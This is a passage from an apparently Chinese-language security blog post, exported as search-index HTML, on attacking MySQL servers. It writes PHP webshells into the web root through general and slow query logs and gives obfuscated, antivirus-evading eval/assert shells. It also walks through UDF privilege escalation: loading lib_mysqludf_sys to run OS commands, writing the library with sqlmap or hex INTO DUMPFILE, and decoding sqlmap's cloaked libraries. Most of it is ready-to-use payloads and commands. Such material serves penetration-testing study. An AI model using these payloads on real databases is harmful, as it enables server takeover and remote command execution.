function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;;</span><br><span class="language-xml">结束后，恢复日志路径，关闭日志监测</span><br><span class="language-xml">set global general_log = off;</span><br><span class="language-xml"></span><br><span class="language-xml">SQL查询免杀shell</span><br><span class="language-xml">select &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$sl</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>, @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-variable">$sl</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br><span class="language-xml"></span><br><span class="language-xml">SELECT &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;f&#x27;</span>=&gt;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;pffff&#x27;</span>=&gt;<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>=&gt;<span class="hljs-string">&#x27;fffff&#x27;</span>,<span class="hljs-string">&#x27;lfaaaa&#x27;</span>=&gt;<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;nnnnn&#x27;</span>=&gt;<span class="hljs-string">&#x27;t&#x27;</span>);<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">array_keys</span>(<span class="hljs-variable">$p</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;pffff&#x27;</span>].<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;pffff&#x27;</span>].<span class="hljs-variable">$a</span>[<span class="hljs-number">2</span>];<span class="hljs-variable">$_</span>= <span class="hljs-string">&#x27;a&#x27;</span>.<span class="hljs-variable">$_</span>.<span class="hljs-string">&#x27;rt&#x27;</span>;<span class="hljs-variable">$_</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]));<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br></code></pre></td></tr></table></figure><h3id="慢查询getshellslow_query_log">慢查询getshell(slow_query_log)</h3><p>如果是普通日志，开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错</p><p>使用慢查询日志时，只有当查询时间超过系统时间时才会记录在日志中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">查看慢查询信息是否开启<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%slow_query_log%&#x27;</span>;<br>启用慢查询日志(默认禁用)<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> slow_query_log<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br>修改日志文件路径<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> slow_query_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;</span>;<br>查看写入慢日志的时间要求<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%long_query_time%&#x27;</span>        <br>执行查询，写入shell<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27;</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-number">11</span>);<br></code></pre></td></tr></table></figure><h2 id="udf提权">udf提权</h2><p><code>user defined function</code>，用户自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL语句中调用，就像调用本机函数 version () 等方便。</p><p>udf在<code>mysql&gt;=5.1</code>的版本中，存在于<code>mysql/lib/plugin</code>目录下，文件后缀为.dll，常用c语言编写。</p><h4 id="流程">流程</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查看secure_file_priv<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br>查看插件目录<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br>如果没有，手工创建（mysql5<span class="hljs-number">.1</span>以后基本不可能成功）<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;D:\\env\\php\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin::$index_allocation&#x27;</span>;<br>上传dll后，创建自定义函数<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;lib_mysqludf_sys_64.dll&#x27;</span>;<br>导入成功后查看一下mysql函数里面是否新增了sys_eval函数：<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;sys_eval&#x27;</span>;<br>执行命令<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>删除函数<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval;<br></code></pre></td></tr></table></figure><p>这里注意如果有webshell可以直接上传dll或so文件就直接上传即可</p><p>如果有注入，但是无webshell，可以利用sqlmap，因为 GET有<strong>字节长度限制</strong>，所以往往 POST注入才可以执行这种攻击</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">sqlmap -u  <span class="hljs-string">&quot;http://localhost:3306/&quot;</span> --data<span class="hljs-operator">=</span><span class="hljs-string">&quot;id=1&quot;</span> --file-write<span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib_mysqludf_sys_64.so&quot;</span>  --file-dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span>  <br></code></pre></td></tr></table></figure><p>如果没有注入，但可以操作原生sql语句，例如进入phpmyadmin中</p><p>利用16进制intodumpfile写入，具体payload查询：https://www.sqlsec.com/tools/udf.html</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">直接 SELECT 查询十六进制写入<br>SELECT  INTO DUMPFILE &#x27;D:<span class="hljs-symbol">\\</span>env<span class="hljs-symbol">\\</span>php<span class="hljs-symbol">\\</span>phpstudy_pro<span class="hljs-symbol">\\</span>Extensions<span class="hljs-symbol">\\</span>MySQL5.7.26<span class="hljs-symbol">\\</span>lib<span class="hljs-symbol">\\</span>plugin<span class="hljs-symbol">\\</span>udf.dll&#x27;;<br></code></pre></td></tr></table></figure><p>dll和so文件</p><p>sqlmap中<code>.dll</code>和<code>.so</code>文件的路径：<code>sqlmap/data/udf/mysql</code></p><p>不过 sqlmap 中自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用sqlmap 自带的解码工具<code>cloak.py</code>来解码使用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">└─<span class="hljs-variable">$pwd</span><br><span class="hljs-regexp">/mnt/</span>c<span class="hljs-regexp">/Penetration/</span>DatabaseTools<span class="hljs-regexp">/SQLMap/</span>extra/cloak<br><span class="hljs-comment"># 解码 32 位的 Linux 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><span class="hljs-comment"># 解码 64 位的 Linux 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><span class="hljs-comment"># 解码 32 位的 Windows 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><span class="hljs-comment"># 解码 64 位的 Windows 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure><p><strong>更多攻击方法参考</strong></p><p>https://www.sqlsec.com/2020/11/mysql.html#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
